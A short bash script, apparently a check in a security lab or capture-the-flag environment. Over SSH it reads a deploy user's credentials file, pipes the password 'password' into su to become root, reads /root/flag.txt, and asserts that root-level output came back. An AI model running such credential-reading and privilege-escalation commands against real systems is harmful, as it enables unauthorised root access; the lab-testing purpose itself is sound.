#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'sudo -u deploy -n cat /home/deploy/credentials.txt >/dev/null && echo password | su - root -c "cat /root/flag.txt"')"
assert_root_output "${out}"
